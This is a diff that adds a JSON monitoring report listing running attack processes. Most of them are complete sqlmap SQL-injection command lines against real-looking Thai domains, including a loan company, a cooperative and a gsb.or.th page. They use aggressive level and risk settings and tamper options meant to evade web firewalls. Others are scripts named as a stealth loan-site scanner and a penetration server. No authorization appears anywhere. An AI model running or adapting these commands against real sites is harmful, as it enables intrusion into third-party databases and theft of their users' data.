@@ -1,0 +1,83 @@
+{
+  "report_time": "2025-10-29T05:10:36.007624",
+  "monitoring_status": "Active",
+  "statistics": {
+    "active_attacks": 0,
+    "total_alerts": 0,
+    "total_processes": 10
+  },
+  "recent_successes": [],
+  "vulnerability_alerts": [],
+  "monitored_processes": [
+    {
+      "pid": 21312,
+      "command": "C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\python.exe C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\Scripts\\sqlmap.exe -u https://peacoop.or.th/members?id=1 -p id --batch --level=5 --risk=3 --random-agent --tamper=space2comment,randomcase,charencode,between,modsecurityversioned --fresh-queries --time-sec=10 --threads=5 --banner --current-db --dbs",
+      "target": "https://peacoop.or.th/members?id=1",
+      "type": "SQLMap Attack",
+      "status": "Running"
+    },
+    {
+      "pid": 24672,
+      "command": "C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\python.exe C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\Scripts\\sqlmap.exe -u https://quickcash.in.th/apply?loan_id=1 -p loan_id --batch --level=5 --risk=3 --random-agent --tamper=space2comment,randomcase,charencode,between --fresh-queries --time-sec=20 --threads=10 --banner --current-db --dbs --tables",
+      "target": "https://quickcash.in.th/apply?loan_id=1",
+      "type": "SQLMap Attack",
+      "status": "Running"
+    },
+    {
+      "pid": 38420,
+      "command": "C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\python.exe C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\Scripts\\sqlmap.exe -u https://quickcash.in.th/v1/apply --method=POST --data=loan_id=1&amount=10000 -p loan_id --batch --level=5 --risk=3 --random-agent --tamper=space2comment,randomcase,charencode --fresh-queries --time-sec=20 --threads=10 --banner --current-db",
+      "target": "https://quickcash.in.th/v1/apply",
+      "type": "SQLMap Attack",
+      "status": "Running"
+    },
+    {
+      "pid": 39188,
+      "command": "C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\python.exe C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\Scripts\\sqlmap.exe -u https://quickcash.in.th/application.php?id=1 -p id --batch --level=5 --risk=3 --random-agent --tamper=space2comment,randomcase,charencode,between,modsecurityversioned --fresh-queries --time-sec=15 --threads=8 --banner --current-db --dbs",
+      "target": "https://quickcash.in.th/application.php?id=1",
+      "type": "SQLMap Attack",
+      "status": "Running"
+    },
+    {
+      "pid": 54656,
+      "command": "C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\python.exe C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\Scripts\\sqlmap.exe -u http://127.0.0.1:5000/user?id=1 -p id --batch --level=1 --risk=1 --fresh-queries --banner --current-db --tables --dump -D testdb -T users -C id,username,password --limit=3",
+      "target": "http://127.0.0.1:5000/user?id=1",
+      "type": "SQLMap Attack",
+      "status": "Running"
+    },
+    {
+      "pid": 65520,
+      "command": "C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\python.exe C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\Scripts\\sqlmap.exe -u https://www.quickcash.in.th/register --method=POST --data=username=test&email=test@example.com&password=test123&phone=1234567890 -p email --batch --level=5 --risk=3 --random-agent --tamper=space2comment,randomcase,charencode --fresh-queries --time-sec=25 --threads=10 --banner --current-db --dbs",
+      "target": "https://www.quickcash.in.th/register",
+      "type": "SQLMap Attack",
+      "status": "Running"
+    },
+    {
+      "pid": 67652,
+      "command": "C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\python.exe C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\Scripts\\sqlmap.exe -u https://www.gsb.or.th/csr/sustainable/csr-projects/csr-news/activities/?category=1461 --dbs --batch --level=5 --risk=3 --tamper=charencode,randomcase,space2comment --user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 --headers=X-Requested-With: XMLHttpRequest --delay=2",
+      "target": "https://www.gsb.or.th/csr/sustainable/csr-projects/csr-news/activities/?category=1461",
+      "type": "SQLMap Attack",
+      "status": "Running"
+    },
+    {
+      "pid": 27232,
+      "command": "C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\python.exe mcp_penetration_server.py",
+      "target": "mcp_penetration_server.py",
+      "type": "Python Exploit",
+      "status": "Running"
+    },
+    {
+      "pid": 30964,
+      "command": "C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\python.exe mcp_penetration_server.py",
+      "target": "mcp_penetration_server.py",
+      "type": "Python Exploit",
+      "status": "Running"
+    },
+    {
+      "pid": 64812,
+      "command": "C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\python.exe thai_loan_stealth_scanner_fixed.py",
+      "target": "thai_loan_stealth_scanner_fixed.py",
+      "type": "Python Exploit",
+      "status": "Running"
+    }
+  ]
+}
